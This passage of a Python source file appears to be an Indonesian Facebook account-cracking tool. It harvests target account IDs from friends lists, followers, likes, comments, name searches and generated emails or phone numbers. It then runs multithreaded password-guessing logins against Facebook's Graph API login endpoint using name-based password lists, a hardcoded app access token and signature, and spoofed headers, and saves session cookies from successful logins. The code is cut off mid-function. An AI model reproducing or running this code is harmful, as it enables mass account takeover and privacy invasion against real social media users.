				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					urut = []
					urut.append(Panel(f'{P2}[{H2}{nom}{P2}]',width=25,padding=(0,8),style=f"{color_table}"))
					urut.append(Panel(f'{P2}{H2}{isi}',width=27,style=f"{color_table}"))
					urut.append(Panel(f'{H2}{len(hem)}',width=25,padding=(0,8),style=f"{color_table}"))
					console.print(Columns(urut))
				else:
					lol.update({str(cih):str(isi)})
					urut = []
					urut.append(Panel(f'{P2}[{H2}{nom}{P2}]',width=25,padding=(0,8),style=f"{color_table}"))
					urut.append(Panel(f'{P2}{H2}{isi}',width=27,style=f"{color_table}"))
					urut.append(Panel(f'{H2}{len(hem)}',width=25,padding=(0,8),style=f"{color_table}"))
					console.print(Columns(urut))
			geeh = console.input(f" {H2}â€¢{P2} hasil result : ")
			try:geh = lol[geeh]
			except KeyError:
				Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} pilih yang bener")
				time.sleep(3);menu()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} file tidak ditemukan")
				time.sleep(3);menu()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni = lin[nocp].split('|')
				coki = lin[nocp].split("|")[2]
				tree = Tree("")
				tree.add(f'{H2}{cpkuni[0]}|{cpkuni[1]}')
				tree.add(f"{H2}{coki}")
				Minimal__Jangan__Fitnah__Ya__Bang(tree)
				nocp +=1
			Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}berhasil mengecek akun hasil ok anda, klik enter untuk kembali ke menu",width=80,padding=(0,3),style=f"{color_table}"))
			console.input(f" {H2}â€¢{P2} klik enter")
			menu()
	
	elif kz in ['3','03']:
		time.sleep(3)
		menu()
	
	else:
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} pilih yang bener")
		time.sleep(3);menu()

###----------[ MENU DUMP PUBLIK ]---------- ###
def Menu__Untuk__DumpPublik___Si__Kontol():
	try:
		token = open('data/tokenku.txt','r').read()
		cok = open('data/coki.txt','r').read()
	except IOError:
		time.sleep(3)
		exit()
	ses = requests.Session()
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}ketik {color_rich}'me'{P2} jika ingin crack dari daftar teman anda sendiri",width=80,padding=(0,8),style=f"{color_table}"))
	kl = console.input(f' {H2}â€¢{P2} masukan id target : ')
	uid.append(kl)
	for userr in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/{userr}?fields=friends.fields(id,name).limit(5000)&access_token={token}',cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					sys.stdout.write(f"\r {H}â€¢{P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except KeyError:
			pass
		except requests.exceptions.ConnectionError:
			Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} koneksi internet anda bermasalah")
			time.sleep(3);exit()
	print("\r")
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}berhasil mengumpulkan {color_rich}{len(id)}{P2} id",width=80,padding=(0,22),style=f"{color_table}"))
	try:
		setting()
	except requests.exceptions.ConnectionError:
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} koneksi internet anda bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} gagal dump id, kemungkinan akun private")
		time.sleep(3);exit()

###----------[ MENU DUMP MASSAL ]---------- ###
def Menu__Untuk__Dump__Publik__Masal___Si__Kontol():
	try:
		token = open('data/tokenku.txt','r').read()
		cok = open('data/coki.txt','r').read()
	except IOError:
		time.sleep(3)
		exit()
	try:
		jum = int(console.input(f' {H2}â€¢{P2} masukan jumlah target : '))
	except ValueError:
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} masukan jumlah dengan benar")
		time.sleep(3);exit()
	if jum<1 or jum>999:
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} gagal dump id, kemungkinan akun private")
		time.sleep(3);exit()
	ses = requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = console.input(f' {H2}â€¢{P2} masukan id ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/{userr}?fields=friends.fields(id,name).limit(5000)&access_token={token}',cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					sys.stdout.write(f"\r {H}â€¢{P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except KeyError:
			pass
		except requests.exceptions.ConnectionError:
			Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} koneksi internet anda bermasalah")
			time.sleep(3);exit()
	print("\r")
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}berhasil mengumpulkan {color_rich}{len(id)}{P2} id",width=80,padding=(0,22),style=f"{color_table}"))
	try:
		setting()
	except requests.exceptions.ConnectionError:
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} koneksi internet anda bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} gagal dump id, kemungkinan akun private")
		time.sleep(3);exit()

###----------[ CRACK DARI KOMEN ]---------- ###
def Menu__Untuk__Dump__Komentar__Masal___Si__Kontol():
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}pastikan akun target yang di pilih bersifat publik jangan private",width=80,padding=(0,4),style=f"{color_table}"))
	ide = input(f' masukan id postingan : ')
	url = 'https://mbasic.facebook.com/'+ide
	try:get_komen(url)
	except KeyboardInterrupt:setting()
	if len(dump)==0:
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} gagal dump id, kemungkinan akun private")
		time.sleep(3);exit()
	setting()

def get_komen(url):
	data = parser(ses.get(url).text,"html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
			nama = ids.text
			if id+"|"+nama in dump:pass
			else:id.append(id+"|"+nama)
			sys.stdout.write(f"\r {H}â€¢{P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
	for z in data.find_all("a",href=True):
		if "Lihat komentar sebelumnyaâ€¦" in z.text:
			try:get_komen("https://mbasic.facebook.com"+z["href"])
			except:pass					

###----------[ DUMP PENGIKUT ]---------- ###
def Menu__Untuk__Dump__Pengikut__Masal___Si__Kontol():
	try:
		token = open('data/tokenku.txt','r').read()
		cok = open('data/coki.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}ketik {color_rich}'me'{P2} jika ingin crack dari total followers anda sendiri",width=80,padding=(0,7),style=f"{color_table}"))
	akun = console.input(f' {H2}â€¢{P2} masukan id target : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r {H}â€¢{P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
			    time.sleep(0.0002)
			except:continue
		print("\r")
		Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}berhasil mengumpulkan {color_rich}{len(id)}{P2} id",width=80,padding=(0,22),style=f"{color_table}"))
		setting()
	except requests.exceptions.ConnectionError:
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} koneksi internet anda bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} gagal dump id, kemungkinan akun private")
		time.sleep(3);exit()

###----------[ CRACK DARI EMAIL  ]---------- ###
def Menu__Untuk__Dump__Email__Masal___Si__Kontol():
	rc = random.choice
	rr = random.randint
	xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f'{P2}masukan nama email, contoh : andi, dian, putri, aditya max 5000 id',width=80,padding=(0,5),style=f"{color_table}"))
	nama = console.input(f' {H2}â€¢{P2} masukan nama target : ')
	if ',' in str(nama):
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} masukan nama, jangan kosong ngab")
		time.sleep(3);exit()
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f'{P2}masukan nama domain, contoh : @gmail.com, @yahoo.com, dll',width=80,padding=(0,9),style=f"{color_table}"))
	doma = console.input(f' {H2}â€¢{P2} masukan nama domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} masukan domain dengan benar")
		time.sleep(3);exit()
	jumlah = console.input(f' {H2}â€¢{P2} total dump : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(dump)==999999:setting()
		sys.stdout.write(f"\r {H}â€¢{P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()	

###----------[ CRACK DARI SEARCH NAME ]---------- ###
def Menu__Untuk__Dump__Pencarian__Masal___Si__Kontol():
	nama = []
	custom = [" muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "]
	custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "]
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}satu nama setara dengan {H2}10.000{P2} username",width=80,padding=(0,17),style=f"{color_table}"))
	nam = console.input(f' {H2}â€¢{P2} masukan nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=35) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
	if(link):
	  sys.stdout.write(f"\r {H}â€¢{P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
	  time.sleep(0.0000003)
	  cari_nama(link)
	else:
	     print("\r")

###----------[ CRACK NOMOR  ]---------- ###
def Menu__Untuk__Dump__Nomor__Masal___Si__Kontol():
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}crack dari nomor wajib menggunakan sandi manual or gabungan",width=80,padding=(0,7),style=f"{color_table}"))
	depan = console.input(f' {H2}â€¢{P2} awalan nomor : ')
	if len(depan)==3:pass
	else:Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} masukan awalan nomor dengan benar");exit()
	jumla = console.input(f' {H2}â€¢{P2} jumlah dump : ')
	for x in range(int(jumla)):
		rr = random.randint
		A = depan
		B = rr(1111,9999)
		C = rr(1,9)
		D = f'{A}{C}-{str(rr(1111,9999))}-{str(B)}'
		if D in id:pass
		else:id.append(D+'|123456')
		sys.stdout.write(f"\r {H}â€¢{P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()		

###----------[ CRACK DARI FILES  ]---------- ###
def Menu__Untuk__Dump__File__Masal___Si__Kontol():
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}masukan nama file dump yang sudah tersedia di /sdcard/namafile.txt",width=80,padding=(0,5),style=f"{color_table}"))
	file = console.input(f' {H2}â€¢{P2} masukan nama file : ')
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:
			   user,nama = data.split('|')
			except:
			   Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} pemisah salah")
			   time.sleep(3);exit()
			id.append(data)
			sys.stdout.write(f"\r {H}â€¢{P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
			time.sleep(0.0000003)
	except FileNotFoundError:
	    Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} file {H2}{file} {P2}tidak tersedia")
	    time.sleep(3);exit()
	print("\r")
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f'\r{P2}total jumlah akun yang tersedia di dalam file {H2}{len(dump)}{reset}',width=80,padding=(0,13),style=f"{color_table}"))
	setting()

###----------[ DUMP LIKE ]---------- ###
def Menu__Untuk__Dump__Likes__Masal___Si__Kontol():
	try:
		token = open('data/tokenku.txt','r').read()
		cok = open('data/coki.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}pastikan postingan memiliki like dan akun harus publik jangan private ",width=80,padding=(0,4),style=f"{color_table}"))
	pil = console.input(f' {H2}â€¢{P2} masukan id postingan : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{pil}?fields=likes.limit(99999)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['likes']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r {H}â€¢{P} mengumpulkan {H}{len(id)}{P} id...");sys.stdout.flush()
			    sys.stdout.flush()
			except:continue
		print('\r') 
		Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}berhasil mengumpulkan {color_rich}{len(id)}{P2} id",width=80,padding=(0,22),style=f"{color_table}"))
		setting()
	except requests.exceptions.ConnectionError:
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} koneksi internet anda bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} gagal dump id, kemungkinan akun private")
		time.sleep(3);exit()

###----------[ SETTING URUTAN ID & METODE ]---------- ###
def setting():
	urut = []
	urut.append(Panel(f'{P2}crack dari id old',width=25,padding=(0,2),title=f"{H2}01",style=f"{color_table}"))
	urut.append(Panel(f'{P2}crack dari id new',width=25,padding=(0,2),title=f"{H2}02",style=f"{color_table}"))
	urut.append(Panel(f'{P2}crack dari id random',width=27,padding=(0,2),title=f"{H2}03",style=f"{color_table}"))
	console.print(Columns(urut))
	hu = console.input(f" {H2}â€¢{P2} crack dari id ? : ")
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		Minimal__Jangan__Fitnah__Ya__Bang(f' {H2}â€¢{P2} pilih yang bener')
		time.sleep(3);exit()
	urut = []
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f'{P2}[{color_rich}01{P2}]. metode {color_rich}b-api.facebook.com {H2}fast crack[white]\n{P2}[{color_rich}02{P2}]. metode {color_rich}b-api.facebook.com {H2}New V2',title=f"{H2}metode Grafh-Api",width=80,padding=(0,16),style=f"{color_table}"))
	hc = console.input(f" {H2}â€¢{P2} pilih metode : ")
	if hc in ['1','01']:
		method.append('Api')
	elif hc in ['2','02']:
		method.append('apikuv2')
	else:
		Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} pilih metode dengan benar ")
		time.sleep(3);exit()
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}[{color_rich}01{P2}]. setting password otomatis \n{P2}[{color_rich}02{P2}]. setting password gabung\n{P2}[{color_rich}03{P2}]. setting password manual",title=f"{H2}setting password",width=80,padding=(0,20),style=f"{color_table}"))
	hc = console.input(f" {H2}â€¢{P2} pilih password : ")
	if hc in ['']:
	  Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}â€¢{P2} terjadi kesalahan ")
	  setting()
	elif hc in ['1','01']:
		otomatis()
	elif hc in ['2','02']:
		Tambahan()
	elif hc in ['3','03']:
		Manual()

###----------[ PASSWORD DEFAULT ]---------- ###
def otomatis():
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}[{color_rich}01{P2}]. crack menggunakan password nama\n{P2}[{color_rich}02{P2}]. crack menggunakan password nama+123\n{P2}[{color_rich}03{P2}]. crack menggunakan password nama+123+12345\n{P2}[{color_rich}04{P2}]. crack menggunakan password nama+123+1234+12345\n{P2}[{color_rich}05{P2}]. crack menggunakan password nama+123+1234+12345+123456\n{P2}[{color_rich}06{P2}]. crack menggunakan password nama+321+1234[/]",title=f"{H2}list password",width=80,padding=(0,8),style=f"{color_table}"))
	pwlis = console.input(f" {H2}â€¢{P2} pilih password : ")
	pwlist.append(pwlis)
	ua = console.input(f" {H2}â€¢{P2} ingin menggunakan useragent tambahan? (Y/t) : ")
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = console.input(f" {H2}â€¢{P2} masukan useragent : ");uadia.append(bz)
		Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{H2}{bz}{reset}",width=80,title=f"{H2}useragent",style=f"{color_table}"))
	if ua in ['t','T']:
		Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}saat ini anda menggunakan user agent bawaan dari script MBF",width=80,padding=(0,8),style=f"{color_table}"))
	else:uadarimu.append('uasc')
	urut = []
	urut.append(Panel(f'{P2}hasil {H2}{okc}',width=39,padding=(0,3),style=f"{color_table}"))
	urut.append(Panel(f'{P2}hasil {K2}{cpc}',width=39,padding=(0,3),style=f"{color_table}"))
	console.print(Columns(urut))
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}mainkan mode pesawat {color_rich}10 [white]detik jika tidak mendapatkan hasil sama sekali",width=80,padding=(0,3),style=f"{color_table}"))
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				if '1' in pwlist:
					pwv=[nmf]
				if '2' in pwlist:
					pwv=[nmf,frs+'123']
				if '3' in pwlist:
					pwv=[nmf,frs+'123',frs+'12345']
				if '4' in pwlist:
					pwv=[nmf,frs+'123',frs+'1234',frs+'12345']
				if '5' in pwlist:
					pwv=[nmf,frs+'123',frs+'1234',frs+'12345',frs+'123456']
				if '6' in pwlist:
					pwv=[nmf,frs+'321',frs+'1234']
				else:pass
				if 'Api' in method:
					pool.submit(Api,idf,pwv)
				elif 'apikuv2' in method: 
					pool.submit(apikuv2,idf,pwv)
				else:
					pool.submit(metode_api,idf,pwv)
		Minimal__Jangan__Fitnah__Ya__Bang(Panel(f'{P2}sukses cracked {H2}{len(id2)}[white] id, dengan jumlah hasil OK : {H2}{ok} {P2}CP : {K2}{cp}{reset}',width=80,padding=(0,8),style=f"{color_table}"))
		time.sleep(3);exit()

###----------[ PASSWORD GABUNG ]---------- ###
def Tambahan():
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}[{color_rich}01{P2}]. crack menggunakan password nama\n{P2}[{color_rich}02{P2}]. crack menggunakan password nama+123\n{P2}[{color_rich}03{P2}]. crack menggunakan password nama+123+12345\n{P2}[{color_rich}04{P2}]. crack menggunakan password nama+123+1234+12345\n{P2}[{color_rich}05{P2}]. crack menggunakan password nama+123+1234+12345+123456\n{P2}[{color_rich}06{P2}]. crack menggunakan password nama+321+1234[/]",title=f"{H2}list password",width=80,padding=(0,8),style=f"{color_table}"))
	pwlis = console.input(f" {H2}â€¢{P2} pilih password : ")
	pwlist.append(pwlis)
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}gunakan tanda koma ({color_rich},{P2}) untuk pemisah password yang anda input{reset}",width=80,padding=(0,5),style=f"{color_table}"))
	pwku = console.input(f" {H2}â€¢{P2} masukan password tambahan : ")
	pwkuh = pwku.split(',')
	for xpw in pwkuh:
		pwnya.append(xpw)
	ua = console.input(f" {H2}â€¢{P2} ingin menggunakan useragent tambahan? (Y/t) : ")
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = console.input(f" {H2}â€¢{P2} masukan useragent : ");uadia.append(bz)
		Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{H2}{bz}{reset}",width=80,title=f"{H2}useragent",style=f"{color_table}"))
	if ua in ['t','T']:
		Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}saat ini anda menggunakan user agent bawaan dari script MBF",width=80,padding=(0,8),style=f"{color_table}"))
	else:uadarimu.append('uasc')
	urut = []
	urut.append(Panel(f'{P2}hasil {H2}{okc}',width=39,padding=(0,3),style=f"{color_table}"))
	urut.append(Panel(f'{P2}hasil {K2}{cpc}',width=39,padding=(0,3),style=f"{color_table}"))
	console.print(Columns(urut))
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}mainkan mode pesawat {color_rich}10 [white]detik jika tidak mendapatkan hasil sama sekali",width=80,padding=(0,3),style=f"{color_table}"))
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				if '1' in pwlist:
					pwv=[nmf]
				if '2' in pwlist:
					pwv=[nmf,frs+'123']
				if '3' in pwlist:
					pwv=[nmf,frs+'123',frs+'12345']
				if '4' in pwlist:
					pwv=[nmf,frs+'123',frs+'1234',frs+'12345']
				if '5' in pwlist:
					pwv=[nmf,frs+'123',frs+'1234',frs+'12345',frs+'123456']
				if '6' in pwlist:
					pwv=[nmf,frs+'321',frs+'1234']
				for xpwd in pwnya:
					pwv.append(xpwd)
				if 'Api' in method:
					pool.submit(Api,idf,pwv)
				elif 'apikuv2' in method: 
					pool.submit(apikuv2,idf,pwv)
				else:
					pool.submit(metode_api,idf,pwv)
		Minimal__Jangan__Fitnah__Ya__Bang(Panel(f'{P2}sukses cracked {H2}{len(id2)}[white] id, dengan jumlah hasil OK : {H2}{ok} {P2}CP : {K2}{cp}{reset}',width=80,padding=(0,8),style=f"{color_table}"))
		time.sleep(3);exit()

###----------[ PASSWORD MANUAL ]---------- ###
def Manual():
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}gunakan tanda koma ({color_rich},{P2}) untuk pemisah password yang anda input{reset}",width=80,padding=(0,5),style=f"{color_table}"))
	pwku = console.input(f" {H2}â€¢{P2} masukan password tambahan : ")
	pwkuh = pwku.split(',')
	for xpw in pwkuh:
		pwnya.append(xpw)
	ua = console.input(f" {H2}â€¢{P2} ingin menggunakan useragent tambahan? (Y/t) : ")
	if ua in ['y','Ya','ya','Y']:
		uadarimu.append('uadia');bz = console.input(f" {H2}â€¢{P2} masukan useragent : ");uadia.append(bz)
		Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{H2}{bz}{reset}",width=80,title=f"{H2}useragent",style=f"{color_table}"))
	if ua in ['t','T','Tidak']:
		Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}saat ini anda menggunakan user agent bawaan dari script MBF",width=80,padding=(0,8),style=f"{color_table}"))
	else:uadarimu.append('uasc')
	urut = []
	urut.append(Panel(f'{P2}hasil {H2}{okc}',width=39,padding=(0,3),style=f"{color_table}"))
	urut.append(Panel(f'{P2}hasil {K2}{cpc}',width=39,padding=(0,3),style=f"{color_table}"))
	console.print(Columns(urut))
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}mainkan mode pesawat {color_rich}10 [white]detik jika tidak mendapatkan hasil sama sekali",width=80,padding=(0,3),style=f"{color_table}"))
	global prog,des
	prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				pwv = []
				for xpwd in pwnya:
					pwv.append(xpwd)
				if 'Api' in method:
					pool.submit(Api,idf,pwv)
				elif 'apikuv2' in method: 
					pool.submit(apikuv2,idf,pwv)
				else:
					pool.submit(metode_api,idf,pwv)
		Minimal__Jangan__Fitnah__Ya__Bang(Panel(f'{P2}sukses cracked {H2}{len(id2)}[white] id, dengan jumlah hasil OK : {H2}{ok} {P2}CP : {K2}{cp}{reset}',width=80,padding=(0,8),style=f"{color_table}"))
		time.sleep(3);exit()

###----------[ CONVERT COOKIE ]---------- ###
def convert(cookie):
        coki2 = ('datr=%s;sb=%s;c_user=%s;xs=%s;fr=%s'%(cookie['datr'],cookie['sb'],cookie['c_user'],cookie['xs'],cookie['fr']))
        return(str(coki))

def ran():
    return str(tod()).split('.')[0]


###----------[ METODE GRAPH ]---------- ###
def Api(idf,pwv):
	global loop,ok,cp
	war = str(random.choice([H2,K2,J2,B2,N2,O2,A2]))
	prog.update(des,description=f"{H2}Crack Api {P2}OK-:{H2}{ok} {P2}CP-:{K2}{cp} {P2}- {war}{str(loop)}/{len(id2)}")
	prog.advance(des)
	KontolXD = ua_krek()
	ses = requests.Session()
	for pw in pwv:
		try:
			ykh = random.randint(2e7, 3e7)
			iyh = random.randint(2e4, 4e4)
			params = {
					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
					"sdk_version": {random.randint(1,26)}, 
					"email": idf,
					"locale": "en_US",
					"password": pw,
					"sdk": "android",
					"generate_session_cookies": "1",
					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
				}
			headers = {
					"Host": "graph.facebook.com",
					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
					"x-fb-sim-hni": str(random.randint(20000, 40000)),
					"x-fb-net-hni": str(random.randint(20000, 40000)),
					"x-fb-connection-quality": "EXCELLENT",
					"user-agent": KontolXD,
					"content-type": "application/x-www-form-urlencoded",
					"x-fb-http-engine": "Liger"
				}
			xnxx = ses.post("https://graph.facebook.com/auth/login", params = params, headers = headers, allow_redirects=False)
			anjg = json.loads(xnxx.text)
			if "session_key" in xnxx.text:
				ok+=1
				coki = anjg["session_cookies"]
